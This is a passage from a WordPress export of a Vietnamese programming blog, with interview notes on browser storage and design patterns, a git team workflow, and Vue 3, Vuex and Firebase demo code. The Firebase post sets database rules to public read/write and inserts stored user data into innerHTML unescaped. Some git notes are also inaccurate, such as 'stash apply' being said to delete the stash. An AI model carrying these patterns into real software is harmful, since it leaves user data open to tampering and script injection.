<td>- Tồn tại tr&ecirc;n 1 phi&ecirc;n l&agrave;m việc (đ&oacute;ng tab) hoặc cố t&igrave;nh x&oacute;a</td>
<td>- Được set thời gian expires, cookie tồn tại đến khi expires&nbsp;. C&oacute; thể set mất đi sau khi đ&oacute;ng tr&igrave;nh duyệt, nếu được set expires l&agrave; N/A</td>
</tr>
<tr>
<td>- K&iacute;ch thước cookie tối đa l&agrave;&nbsp;5MB</td>
<td>- Limited t&ugrave;y thuộc v&agrave;o bộ nhớ hệ thống</td>
<td>- K&iacute;ch thước cookie tối đa l&agrave; 4096 bytes</td>
</tr>
<tr>
<td>-&nbsp;Thường lưu th&ocirc;ng tin d&agrave;i hạn, hoặc token</td>
<td>-&nbsp;Thường lưu th&ocirc;ng tin đơn giản như giỏ h&agrave;ng</td>
<td>- Thường lưu th&ocirc;ng tin đăng nhập</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>- Cookie sẽ được tự động th&ecirc;m v&agrave;o XHR khi gửi request l&ecirc;n API</td>
</tr>
</tbody>
</table>
<button onclick="toggleContent(this)">Hide</button></div></div>

<h3>Câu 6. Design Pattern là gì ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
- Design Pattern là mẫu thiết kế chuẩn được tối ưu nhất khi thiết kế phần mềm. Được sử dụng trong tất cả các Library
- Thiết kế theo Design Pattern có những lợi ích
 + Giảm thời gian code
 + Giảm lỗi
 + Dễ đọc
 + Dễ tái sử dụng

<strong>Phân loại</strong>
1. Creational Pattern - Nhóm khởi tạo
- Signton: 1 class chỉ tạo 1 đối tượng duy nhất
- Abstract Factory: Tạo interface cho nhiều class implement
2. Structural Pattern - Nhóm Cấu trúc
- Decorator: mở rộng thêm chức năng khi chạy
3. Behavioral Pattern - Nhóm hành vi
- Command: hành vi ghi log
- Iterator: truy xuất các đối tượng trong 1 tập hợp

**. Architectural Pattern (Nhóm kiến trúc hệ thống): không được xếp loại
- Hay gặp nhất là MVC

<button onclick="toggleContent(this)">Hide</button></div></div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>582</wp:post_id>
		<wp:post_date><![CDATA[2021-12-01 02:00:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-01 02:00:46]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-26 07:15:12]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-26 07:15:12]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-web-developer-p2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Git cơ bản - 2. Quy trình làm việc nhóm]]></title>
		<link>https://duycode.com/2021/09/01/git-co-ban-2-mot-so-lenh-hay-dung/</link>
		<pubDate>Tue, 31 Aug 2021 19:00:14 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=883</guid>
		<description></description>
		<content:encoded><![CDATA[- Khi là member trong 1 Project nhiều người
- VD: Project chung: https://github.com/duyk30b/demo-project.git
<img src="https://vinatex.com.vn/wp-content/uploads/2017/11/Git-Scm.png" alt="" />

<h2>1. Pull source về Local</h2>
<pre>
git init
git remote add origin https://github.com/duyk30b/demo-project.git

//Trong github có thể có nhiều nhánh. VD: master, developer, feature
//Trường hợp này, chỉ được lấy code từ nhánh "developer" về
git pull origin developer

git branch -a
//Bây giờ ta sẽ thấy tất cả các nhánh
//Chú ý:
-- Các nhánh trên local màu xanh. Dấu * thể hiện đang làm việc ở nhánh nào ==>  Ví dụ: *developer
-- Các nhánh trên remotes màu đỏ ==> Ví dụ: remotes/origin/developer
-- Và để phân biệt nhánh "developer" trên remotes, và "developer" trên local. Git đã tự thêm:
    + Chữ "remotes", và chữ "origin". Ví dụ: developer ==> remotes/origin/developer
    + Khi làm việc với các nhánh trên remotes => thường làm việc với tên: "origin/developer"
</pre>

<h2>2. Tạo nhánh của mình</h2>
-- Tại local, thường thì ko sửa trực tiếp trên nhánh "developer", nhánh này có nhiệm vụ pull code về để xem code mới
-- Ta cần phải tạo ra một nhánh phụ mới, và sửa trên một nhánh phụ đó
<pre>
//Liệt kê các nhánh hiện tại --> Đương nhiên ban đầu local chỉ có nhánh: *developer
git branch -a

//Tạo thêm nhánh mới: feature/yourname
git branch feature/yourname
git checkout feature/yourname
git branch
//Đã tạo nhánh chuyển nhánh: developer và nhánh: *feature/yourname
//Bolus: git checkout -b feature/yourname => Vừa tạo nhánh vừa chuyển sang nhánh mới làm việc

//Khi muốn xóa nhánh "feature/yourname", phải quay về nhánh *developer rồi xóa
git checkout developer 
git branch -d feature/yourname
//Chỉ còn nhánh: *developer
</pre>

<h2>3. Lưu lại phiên làm việc bằng git stash</h2>
-- Khi các file đang làm việc ở trạng thái modified hoặc ở staging
==> không thể chuyển nhánh, merge, rebase ...
==> cần commit các file đó, hoặc giải pháp đơn giản hơn là stash
<pre>
//Kiểm tra những stash đã lưu
git stash list 

//Lưu lại stash
git stash                        ---> Lưu đơn giản
git stash save                   ---> Giống git stash
git stash save "message stash"   ---> Lưu stash mới message

//Sau khi commit hay quay về nhánh, hay làm gì gì đó đã xong, muốn lấy lại code trên stash về làm tiếp
git stash apply                  ---> apply stash gần nhất là stash@{0}
git stash apply stash@{1}        ---> apply stash theo id được chỉ định

//Có thể Xóa các stash đã lưu:
git stash clear                 ---> xóa hết
git stash drop                  ---> xóa stash gần nhất
git stash drop stash@{1}        ---> xóa stash theo id được chỉ định

//Có thể vừa apply stash, vừa xóa stash bằng prop
git stash pop                   ---> apply stash gần nhất là stash@{0} và xóa luôn stash@{0}
git stash apply stash@{1}       ---> apply stash và xóa luôn stash theo id được chỉ định
</pre>

<h2>4. Update code mới nhất tại remotes</h2>
<h3>4.1. Fetch code mới nhất từ remote </h3>
<pre>
//Kiểm tra version các commit tại tất cả các nhánh, xem vị trí đứng của mỗi nhánh đang ở đâu
git log --all -10 --oneline --graph

//Update thông tin mới nhất các nhánh trên remotes
git fetch
//Lúc này, các nhánh trên remote đã có khá nhiều commit mới, cần kiểm tra lại
git log --oneline -10 remotes/origin/developer
</pre>

<h3>4.2. Update code tại nhánh developer (local)</h3>
-- Có 2 cách update code mới, dùng merge hoặc dùng rebase
-- Chọn cách rebase sẽ làm code clean hơn rất nhiều -> khuyên dùng
-- Nhánh *developer là nhánh ko làm việc ==> update mà ko xảy ra conflict -> dùng rebase cho tiện
<pre>
//Chuyển sang nhánh *developer
git branch
git checkout developer

//Cách 1. Dùng Rebase: "Rebase" code từ nhánh origin/developer vào developer(local). 
git rebase origin/developer

//Cách 2. Dùng merge: "Merge" code từ nhánh origin/developer vào developer(local)
// Cách này sẽ tạo ra 1 commit mới, là commit: merge code từ origin/developer vào developer
git merge origin/developer

//Cách 3. dùng Pull: Pull code ở nhánh developer(remotes) về, sau đó merge code vào nhánh hiện tại là developer(local)
git pull github developer

//Kết quả: nhánh *developer đang ở trạng thái giống hệt trên remote: origin/developer
</pre>

<h2>5. Update code tại nhánh feature/yourname</h2>
<h3>5.1. Chuyển về nhánh đang làm việc: feature/yourname </h3>
<pre>
git branch
git checkout feature/yourname
//Kiểm tra xem vị trí commit đang ở đâu
git log --oneline -10 feature/yourname
</pre>

<h3>5.2. Gộp tất cả các commit từ khi rẽ nhánh với remotes thành 1 commit duy nhất</h3>
<pre>
//Kiểm tra vị trí rẽ nhánh
git log --all -10 --oneline --graph
//giả sử số lượng các commit muốn gộp là 3
git rebase -i HEAD~3 
//Xuất hiện 2 file cần chỉnh sửa.
//Edit_1: chọn các commit mới nhất để gộp ==> chuyển từ "pick" => "squash"
//Edit_2: Sửa các message của commit
</pre>


<h3>5.3. Update code tại nhánh feature/yourname(local)</h3>
-- Update code: Có thể dùng rebase hoặc merge tương tự như phần 4.2.
-- Có thể update code từ nhánh "developer" hoặc nhánh "origin/developer" đều được
-- Thường thì nhánh này mình hay làm việc, sẽ xảy ra conflict
<pre>
-- Khi dùng rebase, cần fix các conflict ==> Sau đó continue đến khi xong
git rebase origin/developer
git rebase --continue
</pre>

<h2>6. Push code lên Remotes</h2>
-- Khi push code lên, mình chỉ được push lên nhánh chính mình quản lý: "feature/yourname"
<pre>
git add .
git commit -m "Company-[DEV]-TaskName" -m "create function ABC"
git push --set-upstream github feature/yourname
</pre>

-- Khi làm việc nhóm, thường thì mỗi lần push request 1 commit mà thôi
-- Như vậy, sau khi push commit lên rồi, cần update lại push cũ ==> dùng --amend
<pre>
//Gộp vào commit trước bằng lệnh: --amend
git add .
git commit --amend "Company-[DEV]-TaskName" -m "update create function ABC"
git push
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>883</wp:post_id>
		<wp:post_date><![CDATA[2021-09-01 02:00:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-31 19:00:14]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-09-01 02:00:14]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-31 19:00:14]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[git-co-ban-2-mot-so-lenh-hay-dung]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS3 - CRUD: 3. StudentList with Vuex]]></title>
		<link>https://duycode.com/2021/10/02/vuejs-crud-3-studentlist-with-vuex/</link>
		<pubDate>Fri, 01 Oct 2021 20:00:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1281</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue: Basic CRUD with Vuex</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }

        .loader {
            border: 2px solid #f3f3f3;
            border-radius: 50%;
            border-top: 2px solid red;
            width: 16px;
            height: 16px;
            animation: spin 0.5s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div id="app">
        <button v-on:click="student={ username: '', email: '', id: '' }">New Student</button><br />
        <input type="text" placeholder="username" v-model="student.username" /><br />
        <input type="text" placeholder="email" v-model="student.email" /><br />
        <button @click="saveStudent">{{student.id ? 'Update Student':'Create Student'}}</button><br /><br />
        <input type="text" placeholder="Search..." v-model="filter">
        <button @click="filter=''">x</button>
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>User</th>
                    <th>Email</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <tr v-for="(item, index) in filterStudent" :key="index">
                    <td>{{index + 1}}</td>
                    <td>{{item.username}}</td>
                    <td>{{item.email}}</td>
                    <td>
                        <button @click="getStudentByID(item.id)">Edit</button>
                        <button @click="deleteStudent(item.id)">Delete</button>
                    </td>
                </tr>
            </tbody>
        </table><br />
        <select v-model="url_fakeStudent">
            <option value="https://jsonplaceholder.typicode.com/users">https://jsonplaceholder.typicode.com/users
            </option>
            <option value="https://fakestoreapi.com/users?limit=10">https://fakestoreapi.com/users?limit=10</option>
        </select><br />
        <button @click="getStudentsOnline">Get Student Online</button>
        <div v-show="loading" class="loader"></div>
    </div>

    <script src="https://unpkg.com/vue@3.2.19/dist/vue.global.js"></script>
    <script src="https://unpkg.com/vuex@4.0.2/dist/vuex.global.js"></script>

    <script>
        const Uuid = {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            },
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }

        const api_students = {
            sleep(time) {
                return new Promise((resolve, reject) => {
                    setTimeout(() => {
                        resolve()
                    }, time);
                })
            },
            async getOnline(url) {
                const response = await fetch(url)
                const studentList = await response.json()
                localStorage.setItem('studentList', JSON.stringify(studentList))
                return studentList
            },
            async getByID(id) {
                await this.sleep(500)
                const studentList = JSON.parse(localStorage.getItem('studentList')) || []
                const student = studentList.find(item => item.id == id)
                return student
            },
            async create(student) {
                await this.sleep(500)
                const studentList = JSON.parse(localStorage.getItem('studentList')) || []
                studentList.push(student)
                localStorage.setItem('studentList', JSON.stringify(studentList))
                return student
            },
            async read() {
                await this.sleep(500)
                const studentList = JSON.parse(localStorage.getItem('studentList')) || []
                return studentList
            },
            async update(student) {
                await this.sleep(500)
                const studentList = JSON.parse(localStorage.getItem('studentList')) || []
                const find_student = studentList.find(item => item.id == student.id)
                find_student.username = student.username
                find_student.email = student.email
                localStorage.setItem('studentList', JSON.stringify(studentList))
                return find_student
            },
            async delete(id) {
                await this.sleep(500)
                const studentList = JSON.parse(localStorage.getItem('studentList')) || []
                const find_student = studentList.find(item => item.id == id)
                const newList = studentList.filter(item => item.id !== id)
                localStorage.setItem('studentList', JSON.stringify(newList))
                return find_student
            },
        }
    </script>
    <script>
        const store = Vuex.createStore({
            state() {
                return {
                    studentList: [],
                    loading: false,
                }
            },

            actions: {
                async action_fakeStudentsOnline(context, payload) {
                    context.commit("startLoading")
                    const studentList = await api_students.getOnline(payload)
                    context.commit("setStudentList", studentList)
                },
                async action_getStudents(context) {
                    context.commit("startLoading")
                    const studentList = await api_students.read()
                    context.commit("setStudentList", studentList)
                },
                async action_createStudent(context, payload) {
                    context.commit("startLoading")
                    const student = await api_students.create(payload)
                    context.commit("createStudent", student)
                },
                async action_updateStudent(context, payload) {
                    context.commit("startLoading")
                    const student = await api_students.update(payload)
                    context.commit("updateStudent", student)
                },
                async action_deleteStudent(context, payload) {
                    context.commit("startLoading")
                    const student = await api_students.delete(payload)
                    context.commit("deleteStudent", student)
                },
            },

            mutations: {
                startLoading(state) {
                    state.loading = true
                },
                setStudentList(state, payload) {
                    state.studentList = payload;
                    state.loading = false;
                },
                createStudent(state, payload) {
                    state.studentList.push(payload);
                    state.loading = false;
                },
                updateStudent(state, payload) {
                    const find_student = state.studentList.find(item => item.id == payload.id)
                    find_student.username = payload.username
                    find_student.email = payload.email
                    state.loading = false;
                },
                deleteStudent(state, payload) {
                    state.studentList = state.studentList.filter(item => item.id !== payload.id)
                    state.loading = false;
                },
            },

            getters: {
                studentList: state => state.studentList,
                loading: state => state.loading,
            }
        })

        const RootComponent = {
            data() {
                return {
                    student: { username: '', email: '', id: '' },
                    filter: "",
                    url_fakeStudent: "https://jsonplaceholder.typicode.com/users",
                }
            },
            created() {
                this.$store.dispatch("action_getStudents")
            },
            methods: {
                getStudentsOnline() {
                    console.log(this);
                    this.$store.dispatch('action_fakeStudentsOnline', this.url_fakeStudent)
                },
                saveStudent() {
                    if (!this.student.id) {
                        this.student.id = Uuid.s16();
                        this.$store.dispatch('action_createStudent', { ...this.student })
                    } else {
                        this.$store.dispatch('action_updateStudent', { ...this.student })
                    }
                    this.student = { username: '', email: '', id: '' }
                },
                getStudentByID(id) {
                    api_students
                        .getByID(id)
                        .then(res => this.student = res)
                        .catch(err => console.log(err))
                },
                deleteStudent(id) {
                    this.$store.dispatch('action_deleteStudent', id)
                }
            },
            computed: {
                studentList() {
                    return this.$store.getters.studentList
                },
                loading() {
                    return this.$store.getters.loading
                },
                filterStudent() {
                    return this.studentList.filter(item => item.username.includes(this.filter))
                }
            }
        }
        const app = Vue.createApp(RootComponent).use(store).mount("#app")

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1281</wp:post_id>
		<wp:post_date><![CDATA[2021-10-02 03:00:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-10-01 20:00:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:49:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:49:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-crud-3-studentlist-with-vuex]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VueJS3 - Router: 1. Basic]]></title>
		<link>https://duycode.com/2021/10/05/vuejs3-vuex-1-cai-dat/</link>
		<pubDate>Mon, 04 Oct 2021 18:00:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1307</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue - Router</title>
</head>

<body>
    <div id="app">
        <nav>
            <router-link to="/" tag="li">Home</router-link>
            <router-link to="/user/1">User-1</router-link>
            <router-link to="/about">About</router-link>
            <router-link to="/xxx">xxx</router-link>
        </nav>
        <router-view></router-view>
    </div>

    <script src="https://unpkg.com/vue@3.2.19/dist/vue.global.js"></script>
    <script src="https://unpkg.com/vue-router@4.0.11/dist/vue-router.global.js"></script>

    <script>
        const Home = {template: '<h2>Home Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>'}
        const User = {template: '<h2>User Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>'}
        const About = {template: '<h2>About Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>'}
        const NotFound = {template: '<h2>NotFound Page</h2><p>{{JSON.stringify($route, null, 4)}}</p>'}

        const routes = [
            {path: '/', component: Home},
            {path: '/user/:id', component: User},
            {path: '/about', component: About},
            {path: '/layzy-component', component: () => import('./views/UserDetails')},
            {path: '/:pathMatch(.*)', component: NotFound},
        ]

        const router = VueRouter.createRouter({
            history: VueRouter.createWebHistory(),
            routes,
        })
      
        const app = Vue.createApp({})
        app.use(router)
        app.mount("#app")
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1307</wp:post_id>
		<wp:post_date><![CDATA[2021-10-05 01:00:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-10-04 18:00:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:52:13]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:52:13]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs3-vuex-1-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Realtime-Database: 1. Basic CRUD and Listen events on change value]]></title>
		<link>https://duycode.com/2021/08/15/realtime-database-1-basic-crud-and-listen-events-on-change-value/</link>
		<pubDate>Sat, 14 Aug 2021 18:00:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1570</guid>
		<description></description>
		<content:encoded><![CDATA[* Những lưu ý của Firebase
-- Document firebase-realtime: <a href="https://firebase.google.com/docs/web/setup" rel="noopener" target="_blank">https://firebase.google.com/docs/web/setup</a>
-- Cần cài đặt phân quyền trong mục Rules trước để dễ dàng sửa đồi
<pre>
{
  "rules": {
    ".read": true,
    ".write": true,
  }
}
</pre>
-- Nếu chỉ sử dụng Realtime Database, chỉ cần cài đặt firebase-app và firebase-database. Config cũng chỉ cần databaseURL là quá đủ

<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Realtime Database</title>
    <style>
        table {
            border-collapse: collapse;
            counter-reset: row_number 0;
        }

        tbody tr {
            counter-increment: row_number 1;
        }

        tbody tr td:first-child::before {
            content: counter(row_number);
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="app">
        <input type="text" placeholder="username" id="ip_username"><br />
        <input type="text" placeholder="email" id="ip_email"> <br />
        <button onclick="add_user(); reset_form()">Add User</button>
        <button onclick="update_user(); reset_form()">Update User</button>
        <button onclick="replace_user(); reset_form()">Replace User</button><br /><br />

        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="tbody_list"></tbody>
        </table>
    </div>

    <script>
        let ip_username = document.getElementById("ip_username");
        let ip_email = document.getElementById("ip_email");
        let tbody_list = document.getElementById("tbody_list");
        let uid = null;

        let create_row = (key, value) => {
            let tr = document.createElement("tr");
            tr.innerHTML = `<td data-id="${key}"></td><td>${value.username}</td><td>${value.email}</td>
                            <td><button onClick=get_user("${key}")>Sửa</button>
                                <button onClick=delete_user("${key}")>Xóa</button></td>`;
            return tr;
        }

        let add_row_table = (key, value) => {
            let tr = create_row(key, value);
            tbody_list.appendChild(tr);
        }

        let redraw_table = (listUser) => {
            tbody_list.innerHTML = "";
            Object.entries(listUser).forEach(([key, value], index) => {
                add_row_table(key, value)
            });
        }

        const reset_form = () => {
            ip_username.value = "";
            ip_email.value = "";
            uid = null;
        }
    </script>

    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->
    <script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-database.js"></script>
    <script>
        //Nếu chỉ dùng Database Realtime, chỉ cần config: databaseURL
        firebase.initializeApp({
            databaseURL: "https://duycode-77e9a-default-rtdb.asia-southeast1.firebasedatabase.app/",
        });
        //0. Giả sử ban đầu, database trống trơn, "null" đó.
        const usersRef = firebase.database().ref('/users');

        // 1. CREAD: Add new User
        let add_user = () => {
            let user = {
                username: ip_username.value,
                email: ip_email.value,
            }
            //push(): là chỉ định 1 đường dẫn con bên trong "/users" dạng "users/SDFWVX234ds"
            //Khi set, đường dẫn "users/SDFWVX234ds" sẽ tự động được tạo trên database
            usersRef.push().set(user)
                .then(res => console.log("Add User Success !!!", res))
                .catch(err => console.error(err))
        }

        // 2. READ: "get": chỉ đọc database 1 lần duy nhất
        let get_user = (userId) => {
            usersRef.child(userId).get()
                .then((snapshot) => {
                    if (snapshot.exists()) {
                        ip_username.value = snapshot.val().username;
                        ip_email.value = snapshot.val().email;
                        uid = snapshot.key;
                    } else {
                        console.log("No data available");
                    }
                })
                .catch(err => console.error(err))
        }

        // 3. UPDATE
        let update_user = () => {
            let list_update = {};
            // Có thể update nhiều trường 1 lúc, với key là uid. Trường hợp này chỉ update 1 field :D
            list_update[uid] = {
                username: ip_username.value,
                email: ip_email.value,
            }
            usersRef.update(list_update)
                .then((res) => { console.log("Update User Success !!!", res); })
                .catch(err => { console.error(err) })
        }

        // 4. REPLACE
        let replace_user = () => {
            let user = {
                username: ip_username.value,
                email: ip_email.value,
            }
            usersRef.child(uid).set(user)
                .then((res) => { console.log("Update User Success !!!", res); })
                .catch(err => { console.error(err) })
        }

        // 5. DELETE: Có thể dùng remove, hoặc "set(null)", hoặc update với "[key]: null"
        let delete_user = (uid) => {
            usersRef.child(uid).remove();
            // firebase.database().ref('users/' + uid).set(null)
            // usersRef.update({[uid]: null})
        }


        // 6.1. READ LIST: "on": Đọc dữ liệu và lắng nghe database liên tục
        //Như vậy 6 và 7 không nên sử dụng cùng nhau
        usersRef.on('value', (snapshot) => {
            let listUser = snapshot.val() || {};
            //redraw_table(listUser);
        });

        //6.2. READ LIST: "once": Chỉ đọc database 1 lần duy nhất
        usersRef.once('value')
            .then((snapshot) => {
                let listUser = snapshot.val() || {};
                //redraw_table(listUser);
            })
            .catch(err => { console.error(err) })


        //7. Event: Có thể lắng nghe các sự kiện của children khi thêm sửa xóa
        // Khi khởi chạy, dù thằng cha có nhiều thằng con từ trước
        // nhưng thằng "child_added" lại cứ hiểu là mới nhận về. thế mới đau
        usersRef.on('child_added', (data) => {
            add_row_table(data.key, data.val());
        });

        usersRef.on('child_changed', (data) => {
            let new_tr = create_row(data.key, data.val());
            let td = document.querySelector(`td[data-id="${data.key}"]`);
            td.closest('tr').outerHTML = new_tr.outerHTML;
        });

        usersRef.on('child_removed', (data) => {
            let td = document.querySelector(`td[data-id="${data.key}"]`);
            td.closest('tr').remove();
        });


    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1570</wp:post_id>
		<wp:post_date><![CDATA[2021-08-15 01:00:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-14 18:00:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-08-15 01:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-14 18:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[realtime-database-1-basic-crud-and-listen-events-on-change-value]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="firebase"><![CDATA[FireBase]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS3 - Count: 1. Vuex without Component]]></title>
		<link>https://duycode.com/2021/10/01/vuejs-count-1-vuex-without-component/</link>
		<pubDate>Thu, 30 Sep 2021 18:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1631</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://vuex.vuejs.org/vuex.png" alt="" />
-- Vuex là 1 store viết riêng cho Vue để xử lý các state dùng chung cho nhiều Component
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vuex for Vue</title>
</head>

<body>
    <div id="app"></div>
    <input id="ipAmount" type="number" value="1">
    <button id="btnIncrement">Increment</button>
    <button id="btnDecrement">Decrement</button>
    <p id="txtCount"></p>

    <script src="https://unpkg.com/vue@3.1.5/dist/vue.global.js"></script>
    <script src="https://unpkg.com/vuex@4.0.2/dist/vuex.global.js"></script>

    <script>
        const $ = document.querySelector.bind(document);

        //1. Tạo store Vuex
        const store = Vuex.createStore({
            state() {
                return {
                    count: 0,
                }
            },
            //3. Action nhận dispatch, xử lý payload rồi commit mutations
            actions: {
                increment(context, payload) {
                    context.commit('increment', payload);
                },
                decrement(context, payload) {
                    context.commit('decrement', payload);
                }
            },

            //Chỉ có thể thay đổi giá trị của state tại mutations
            mutations: {
                increment(state, payload) {
                    state.count += payload.amount;
                },
                decrement(state, payload) {
                    state.count -= payload.amount;
                },
            },

            //Getters có thể nhận 1 biến, hoặc 1 function đều được
            getters: {
                countFix: state => custom => {
                    return state.count.toFixed(custom)
                }
            }
        })

        // 2. Dispatch Action ==> có 2 cách viết, dispatch cả object kèm type, hoặc tách rời
        $('#btnIncrement').onclick = () => {
            let n = Number($('#ipAmount').value)
            //store.dispatch('increment', { amount: n })
            store.dispatch({
                type: 'increment',
                amount: n,
            })
        }

        $('#btnDecrement').onclick = () => {
            let n = Number($('#ipAmount').value)
